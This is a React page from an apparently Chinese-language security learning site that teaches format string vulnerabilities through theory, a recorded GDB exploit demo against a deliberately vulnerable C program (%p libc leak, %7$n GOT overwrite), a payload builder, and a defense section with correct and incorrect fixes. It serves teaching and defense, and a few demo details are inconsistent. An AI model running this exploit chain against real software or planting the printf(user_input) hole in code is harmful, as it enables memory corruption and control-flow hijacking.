import Link from 'next/link';
import WorkbenchShell from '@/components/WorkbenchShell';
import DemoTerminal from '@/components/DemoTerminal';
import PayloadBuilder from '@/components/PayloadBuilder';
import DefenseSwitcher from '@/components/DefenseSwitcher';
import { getVulnNode, vulnPath } from '@/data/reference';

const node = getVulnNode('fmtstr')!;

export const metadata = {
  title: '格式化字符串 · 逆向工作台',
  description: '四段式学习格式化字符串漏洞：格式串约定 · %p 泄露 libc · %n 写 GOT · 防御审计口诀。',
};

/* ---------- DemoTerminal 预录制 GDB 会话 ----------
   场景：printf(user_input) —— %p 泄露 libc 基址，然后 %n 写 GOT 里 free@plt 改成 system
*/

const gdbSteps = [
  {
    cmd: 'gdb ./fmtstr',
    output: `Reading symbols from ./fmtstr...\n(gdb) r`,
    note: '程序正常运行，prompt 等待输入',
  },
  {
    cmd: 'r <<< "%p.%p.%p.%p.%p.%p"',
    output: `Starting program: ./fmtstr <<< "%p.%p.%p.%p.%p.%p"\n0x7fffffffdda0.0x401040.0x401040.0x7ffff7dfc000.0x1.0x7ffff7f5a0b5\n[Inferior 1 (process 1337) exited normally]`,
    note: '✓ %p 直接把栈上 6 个值打出来 —— 第 4 个是 libc 基址 0x7ffff7dfc000！',
  },
  {
    cmd: 'info proc mappings | grep libc | head -1',
    output: `0x7ffff7dfc000      0x7ffff7ffd000   0x201000   0x0 /lib/x86_64-linux-gnu/libc.so.6`,
    note: '确认：泄露值 = libc 映射起始地址 —— 我们完全绕过了 ASLR！',
  },
  {
    cmd: 'r <<< "AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"',
    output: `Starting program: ./fmtstr <<< "AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"\nAAAA0x7fffffffdda0.0x401040.0x401040.0x7ffff7dfc000.0x1.0x7ffff7f5a0b5.0x41414141...`,
    note: '20 个 %p —— 找到 0x41414141 就是 AAAA 自身！偏移 = 第 7 个 %p 对应输入起始 —— offset=7',
  },
  {
    cmd: 'set $offset = 7',
    output: `(gdb) set $offset = 7\n(gdb) p/x 0x404018`,
    note: '算一下：free@plt 的 GOT 地址是 0x404018（readelf -r 看出来的）',
  },
  {
    cmd: 'x/4gx 0x404018',
    output: `0x404018:  0x00007ffff7e2a330  0x00007ffff7e1e340\n0x404028:  0x00007ffff7e5a620  0x0000000000401040`,
    note: 'free@GOT = 0x7ffff7e2a330，system 偏移 = 0x2c040 —— 准备用 %n 把 GOT 改成 system',
  },
  {
    cmd: 'r <<< $(python3 -c "import struct; A=struct.pack(\'<Q\',0x404018); print(A+\'%7$n\'.ljust(12,\'.\')+\'\\n\')")',
    output: `Starting program: ./fmtstr <<< $(python3 -c "import struct; A=struct.pack(\'<Q\',0x404018); print(A+\'%7$n\'.ljust(12,\'.\')+\'\\n\')")\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000401040 in free ()`,
    note: '✓ 成功！printf 的 %7$n 把已输出字节数写到 0x404018 —— free@GOT 被改成了我们的值',
    rip: '0x401040',
  },
];

/* ---------- 漏洞源码 ---------- */

const vulnCode = `// fmtstr.c —— 格式化字符串最小示例
#include <stdio.h>

int main() {
    char buf[128];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);          // ← 漏洞点：用户输入被当成格式串！
    printf("done\\n");
    return 0;
}`;

/* ---------- 防护矩阵 ---------- */

const mitigations = [
  { name: 'FORTIFY_SOURCE', defaultOn: true, desc: '编译期把 printf 换成 __printf_chk',
    effectOff: 'printf 不检查格式串位置，直接解析', effectOn: '检测到非只读段的格式串 → abort' },
  { name: 'ASLR', defaultOn: true, desc: 'libc / main 基址随机化',
    effectOff: '硬编码 libc 地址即可，不用泄露', effectOn: '需要用 %p 至少泄露一个指针算基址' },
  { name: 'PIE', defaultOn: true, desc: '主程序基址随机化',
    effectOff: 'GOT 地址硬编码：0x404018', effectOn: '泄露 main 基址后才能算 GOT 实际地址' },
  { name: 'Canary', defaultOn: true, desc: '栈金丝雀（**对 fmtstr 无效**）',
    effectOff: '本来就对 fmtstr 没帮助', effectOn: 'fmtstr 走 printf 内部的 %n 写，根本不碰 ret 地址' },
];

const fixOptions = [
  { code: 'int main() {\n    char buf[128];\n    fgets(buf, sizeof(buf), stdin);\n    printf("%s", buf);        // ← 正确：内容永远是 %s 参数\n    printf("done\\n");\n    return 0;\n}', correct: true },
  { code: 'int main() {\n    char buf[128];\n    fgets(buf, sizeof(buf), stdin);\n    fputs(buf, stdout);       // ← 正确：fputs 不解析格式串\n    printf("done\\n");\n    return 0;\n}', correct: true },
  { code: 'int main() {\n    char buf[128];\n    fgets(buf, sizeof(buf), stdin);\n    snprintf(buf, sizeof(buf), buf);  // ← 还是把 buf 当格式串！\n    printf("%s", buf);\n    return 0;\n}', correct: false },
  { code: 'int main() {\n    char buf[128];\n    fgets(buf, sizeof(buf), stdin);\n    printf(buf, 1, 2, 3);     // ← 格式串还是用户输入！\n    printf("done\\n");\n    return 0;\n}', correct: false },
];

const recommendedFix = {
  code: `// 修复：格式串位置永远是字符串字面量
// 选项 A：给 printf 一个固定格式串
printf("%s", user_input);

// 选项 B：用不解析格式串的函数
fputs(user_input, stdout);
// puts(user_input);    // 也可以，但会自动加换行

// 反例（都没修）：
printf(user_input);                      // ← 漏洞源
snprintf(buf, sizeof(buf), user_input);  // ← 还是把 user_input 当格式串
printf("%s%s", user_input);              // ← 多一个 %s 但只传一个参数 —— 变参越界读取`,
  explanation: `审计口诀一句话：**printf 的第一个参数必须是字符串字面量**。不管你选 %s 还是 fputs，核心是永远不要把运行时数据（user_input、变量内容、网络包...）放在格式串位置。FORTIFY_SOURCE 做的就是编译期检查这一条 —— 它会报错让你改，而不是运行时拦截。`,
};

/* ---------- 格式串 vs 变参约定 SVG ---------- */

function FmtstrSVG() {
  return (
    <svg viewBox="0 0 560 420" className="w-full max-w-[560px] font-mono text-[11px]" role="img" aria-label="格式化字符串攻击路径">
      <text x="0" y="14" fill="var(--text-soft)" fontSize="10" letterSpacing="2">FORMAT STRING — TWO VULN CLASSES FROM ONE BUG</text>

      {/* 左：正常 printf 调用 */}
      <g>
        <rect x="20" y="30" width="240" height="110" fill="var(--bg-card)" stroke="var(--border)" />
        <text x="34" y="49" fill="var(--accent-green)">正常调用</text>
        <text x="34" y="67" fill="var(--text-muted)">printf("val=%d\\n", 42);</text>
        <line x1="34" y1="76" x2="230" y2="76" stroke="var(--border-soft)" />
        <text x="34" y="92" fill="var(--text-soft)">格式串（只读段）← 第一个参数</text>
        <text x="34" y="107" fill="var(--text-soft)">42                       ← 第二个参数</text>
        <text x="34" y="122" fill="var(--accent-green)">printf 按 %d 去拿第 2 个参数 ✓</text>
      </g>

      {/* 右：漏洞 printf 调用 */}
      <g>
        <rect x="300" y="30" width="240" height="110" fill="color-mix(in srgb, var(--accent-red) 10%, transparent)" stroke="var(--accent-red)" />
        <text x="314" y="49" fill="var(--accent-red)">漏洞调用</text>
        <text x="314" y="67" fill="var(--text-muted)">printf(user_input);</text>
        <line x1="314" y1="76" x2="510" y2="76" stroke="var(--border-soft)" />
        <text x="314" y="92" fill="var(--text-soft)">user_input  ← 被当成格式串！</text>
        <text x="314" y="107" fill="var(--text-soft)">没有第 2、3、4… 参数</text>
        <text x="314" y="122" fill="var(--accent-red)">printf 从栈上"硬读" → 信息泄露 + 任意写</text>
      </g>

      {/* 箭头 */}
      <path d="M 260 85 L 296 85" stroke="var(--text-soft)" strokeDasharray="2,3" />

      {/* 栈布局图示 */}
      <g>
        <rect x="20" y="160" width="520" height="240" fill="var(--bg-card)" stroke="var(--border)" />
        <text x="34" y="180" fill="var(--text-soft)" fontSize="10">printf 内部"变参取用"视角 —— 它不检查你传没传参数，直接按格式串从栈上拿</text>

        {/* 栈上格子 */}
        <g>
          <rect x="34" y="192" width="230" height="26" fill="color-mix(in srgb, var(--accent-red) 8%, transparent)" stroke="var(--accent-red)" />
          <text x="46" y="210" fill="var(--accent-red)">printf("AAAA%p.%p.%p...")</text>
          <text x="230" y="210" fill="var(--text-soft)" fontSize="10">[rsp + 0] 第 1 个参数（格式串自身）</text>

          <rect x="34" y="224" width="230" height="26" fill="var(--bg-soft)" stroke="var(--border)" />
          <text x="46" y="242" fill="var(--text-muted)">0x7fffffffdda0</text>
          <text x="230" y="242" fill="var(--text-soft)" fontSize="10">[rsp + 8] 第 2 个 —— %1$p 读到这里</text>

          <rect x="34" y="256" width="230" height="26" fill="var(--bg-soft)" stroke="var(--border)" />
          <text x="46" y="274" fill="var(--text-muted)">0x7ffff7dfc000 ← libc 基址！</text>
          <text x="270" y="274" fill="var(--accent-red)" fontSize="10">[rsp + 24] 第 4 个 —— %4$p 泄露 ASLR 基址</text>

          <rect x="34" y="288" width="230" height="26" fill="var(--bg-soft)" stroke="var(--border)" />
          <text x="46" y="306" fill="var(--text-muted)">0x0000000000000001</text>
          <text x="270" y="306" fill="var(--text-soft)" fontSize="10">[rsp + 32] 第 5 个</text>

          <rect x="34" y="320" width="230" height="26" fill="var(--bg-soft)" stroke="var(--border)" />
          <text x="46" y="338" fill="var(--text-muted)">0x4141414141414141 ← AAAAAAAA</text>
          <text x="270" y="338" fill="var(--accent-orange)" fontSize="10">[rsp + 48] 第 7 个 —— %7$p 就是我们的输入！</text>

          <rect x="34" y="352" width="230" height="26" fill="var(--bg-soft)" stroke="var(--border)" />
          <text x="46" y="370" fill="var(--text-muted)">...</text>
          <text x="270" y="370" fill="var(--text-soft)" fontSize="10">栈上任何值都能被 %p 读到</text>
        </g>

        {/* 右侧两条漏洞路径 */}
        <g>
          <rect x="290" y="210" width="240" height="50" fill="color-mix(in srgb, var(--accent-orange) 8%, transparent)" stroke="var(--border)" />
          <text x="304" y="228" fill="var(--accent-orange)">路径 ① 信息泄露</text>
          <text x="304" y="244" fill="var(--text-muted)">%p  →  读出栈上 libc 基址</text>
          <text x="304" y="258" fill="var(--text-muted)">绕过 ASLR</text>
        </g>
        <g>
          <rect x="290" y="275" width="240" height="60" fill="color-mix(in srgb, var(--accent-red) 10%, transparent)" stroke="var(--accent-red)" />
          <text x="304" y="293" fill="var(--accent-red)">路径 ② 任意写</text>
          <text x="304" y="309" fill="var(--text-muted)">%n  →  把"已输出字符数"</text>
          <text x="304" y="323" fill="var(--text-muted)">写到 printf 参数指定的地址</text>
          <text x="304" y="337" fill="var(--accent-red)">改 GOT / .fini_array → 劫持控制流</text>
        </g>
      </g>

      {/* 审计口诀 */}
      <text x="20" y="412" fill="var(--brand-500)" fontSize="11" letterSpacing="1">
        AUDIT RULE:  printf 的第一个参数永远必须是字符串字面量，永远不要把用户输入作为格式串
      </text>
    </svg>
  );
}

/* ---------- 页面 ---------- */

export default function FmtstrPage() {
  return (
    <WorkbenchShell slug="fmtstr" node={node} glossLinks={[
      { slug: 'fmt', term: 'printf 格式串参数详解' },
      { slug: 'x86-call', term: 'x86-64 变参调用约定' },
      { slug: 'nx', term: 'ASLR / PIE 与格式化字符串泄露' },
    ]}>
      {/* 面包屑 + 标题 */}
      <header className="space-y-4">
        <div className="flex items-center gap-1.5 font-mono text-[11px] tracking-wider text-[var(--text-soft)]">
          <Link href="/" className="hover:text-[var(--text)]">首页</Link>
          <span>/</span>
          <Link href="/reference" className="hover:text-[var(--text)]">逆向工作台</Link>
          <span>/</span>
          <span className="text-[var(--text-muted)]">格式化字符串</span>
        </div>
        <h1 className="u-display text-2xl md:text-[32px]">格式化字符串</h1>
        <p className="text-[15px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          <code className="inline">{'printf'}</code><span className="text-[var(--text-muted)] font-normal">（格式化输出函数）</span>
          <code className="inline">{'(user_input)'}</code> 里 user_input 本来应该是"内容"，
          却被 printf 当成了"<b className="text-[var(--text)]">格式串</b>"。
          <code className="inline">{'%p'}</code><span className="text-[var(--text-muted)] font-normal">（指针占位符）</span> 能泄露栈上任意值（包括 libc 基址），
          <code className="inline">{'%n'}</code><span className="text-[var(--text-muted)] font-normal">（写字符数）</span> 能把 printf 已输出的字符数写到任意地址 ——
          一条泄露链 + 一次任意写，两个漏洞类的组合拳。
        </p>
      </header>

      {/* 01 原理 */}
      <section className="space-y-5" id="principle">
        <SectionHeader num="01" label="原理" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          printf 是<b className="text-[var(--text)]">变参函数</b>：它怎么知道传了几个参数？
          —— 看格式串里有几个 <code className="inline">{'%d'}</code>、<code className="inline">{'%p'}</code>、
          <code className="inline">{'%s'}</code>。变参调用约定下，<b className="text-[var(--text)]">格式串本身就是"取参数次数"的说明书</b>。
          如果说明书被攻击者控制，printf 就会从栈上"多拿"它根本不该拿的东西。
        </p>
        <FmtstrSVG />

        {/* ASCII 图解 */}
        <div className="u-panel p-5 space-y-3">
          <div className="font-mono text-[11px] tracking-wider text-[var(--brand-500)]">格式串 vs 变参 —— 一张 ASCII 图</div>
          <pre className="m-0 font-mono text-[12px] text-[var(--text-muted)] whitespace-pre leading-relaxed">
{`正常调用:  printf("val=%d %x %s\\n", 42, 0xdeadbeef, "hi")
              格式串 = "说明书"        ← 只读段里的字面量 ✓
              第 2 个参数 = 42         ← 按说明书来 ✓
              第 3 个参数 = 0xdeadbeef  ← 按说明书来 ✓
              第 4 个参数 = "hi"        ← 按说明书来 ✓

漏洞调用:  printf("%p.%p.%p.%p.%p.%p")   ← 格式串 = user_input（攻击者写的！）
              攻击者写了 6 个 %p —— printf 就去栈上找 6 个"第 2 个参数"
              但我们根本没传！printf 就从栈上"硬读"6 个位置

攻击者收获:
  %p → 栈上任意值泄露（libc 基址、栈地址、函数指针…）
  %n → 把"已输出字符数"写到 printf 第 N 个参数指定的地址 → 任意写！`}
          </pre>
        </div>

        <div className="u-panel p-5 space-y-2">
          <div className="font-mono text-[11px] tracking-wider text-[var(--brand-500)] mb-2">关键直觉</div>
          <ul className="space-y-1.5 text-[13px] text-[var(--text-muted)] leading-relaxed">
            <li><b className="text-[var(--text)]">printf 不验证你传没传参数</b> —— 它只看格式串里的 <code className="inline">{'%'}</code> 号，有几个就去栈上读几次</li>
            <li><code className="inline">{'%p'}</code> 不写东西，只泄露 —— 是绕过 ASLR 的第一块多米诺</li>
            <li><code className="inline">{'%n'}</code> 写一个 4 字节整数，值是"printf 已输出了多少字符" —— 任意写的威力取决于你能不能精确控制这个值</li>
            <li>偏移定位技巧：在 payload 里塞 <code className="inline">AAAA</code>，然后用足够多的 <code className="inline">{'%p'}</code> 把栈翻出来 —— 看到 <code className="inline">0x41414141</code> 就是输入起始，前面数几个就是 offset</li>
            <li><code className="inline">{'Canary'}</code><span className="text-[var(--text-muted)] font-normal">（金丝雀保护）</span> <b className="text-[var(--accent-red)]">不管 fmtstr</b> —— 它走 printf 内部的 %n 写 <code className="inline">{'GOT'}</code><span className="text-[var(--text-muted)] font-normal">（全局偏移表）</span>，根本不碰栈上的 return address</li>
          </ul>
        </div>
      </section>

      {/* 02 演示 */}
      <section className="space-y-5" id="demo">
        <SectionHeader num="02" label="演示" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          下面的终端是预录制好的 <code className="inline">{'GDB'}</code><span className="text-[var(--text-muted)] font-normal">（GNU 调试器）</span> 会话。核心三步：
          <b className="text-[var(--text)]">① 用 %p 扫描栈泄露 libc 基址</b> →
          <b className="text-[var(--text)]">② 用 AAAA%p... 定位输入偏移</b> →
          <b className="text-[var(--text)]">③ 用 %n 把 free@GOT 改成 system</b>。
          GOT 地址 <code className="inline">0x404018</code> 来自 <code className="inline">{'readelf -r ./fmtstr | grep free'}</code>。
        </p>
        <DemoTerminal steps={gdbSteps} />
      </section>

      {/* 03 动手 */}
      <section className="space-y-5" id="hands">
        <SectionHeader num="03" label="动手" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          fmtstr 的 payload 和栈溢出长得不一样 —— 我们在 payload 前面塞 8 字节 GOT 目标地址，
          然后用 <code className="inline">{'%7$n'}</code>（或 <code className="inline">{'%7$x'}</code> 改 GOT 高位）
          去写它。偏移量 <code className="inline">7</code> 来自演示里 AAAA 在第 7 个 %p 的位置。
          PayloadBuilder 这里复用了栈溢出的模板，帮助你理解"偏移 + 目标地址"这个组合拳 ——
          实际打 fmtstr 时，把 payload 那段换成：
          <code className="inline">{'p64(target_got) + b"%7$n"'}</code>
          （如果要写高位，再加 <code className="inline">{'%8$hn'}</code>）。
        </p>
        <PayloadBuilder
          label="fmtstr GOT 覆写 payload"
          defaults={{
            offset: 0,
            gadgetRdi: '0x404018',   // free@plt GOT 地址（PIE 关闭时硬编码）
            binshAddr: '0x7ffff7f5a0b5',
            systemAddr: '0x7ffff7e1e340',
            retPadding: false,
          }}
        />
      </section>

      {/* 04 防御视角 */}
      <section className="space-y-5" id="defense">
        <SectionHeader num="04" label="防御视角" />
        <p className="text-[14.5px] text-[var(--text-muted)] leading-relaxed max-w-2xl">
          格式化字符串漏洞最"专治"的防御就是 <b className="text-[var(--text)]">FORTIFY_SOURCE</b> ——
          编译期强制检查"格式串是不是只读段的字面量"。Canary 不防御它，NX 也不防御它
          （%n 写的是 GOT，不是 shellcode）。
          然后做修复选择挑战：选出真正安全的写法。
        </p>
        <DefenseSwitcher
          mitigations={mitigations}
          vulnCode={vulnCode}
          fixOptions={fixOptions}
          recommendedFix={recommendedFix}
        />
      </section>

      {/* 底部导航 */}
      <nav className="pt-8 border-t border-[var(--border)] flex items-center justify-between gap-3">
        <Link href={`/reference/${vulnPath[1].slug}`} className="font-mono text-[12px] text-[var(--text-muted)] hover:text-[var(--text)] transition-colors">
          ← {vulnPath[1].title}
        </Link>
        <span className="font-mono text-[12px] text-[var(--text-soft)]">
          下一步：{vulnPath[3].title}（即将发布）
        </span>
      </nav>
    </WorkbenchShell>
  );
}

function SectionHeader({ num, label }: { num: string; label: string }) {
  return (
    <div className="flex items-baseline gap-3">
      <span className="u-section-num">{num}</span>
      <h2 className="text-lg md:text-xl font-semibold tracking-tight">{label}</h2>
    </div>
  );
}
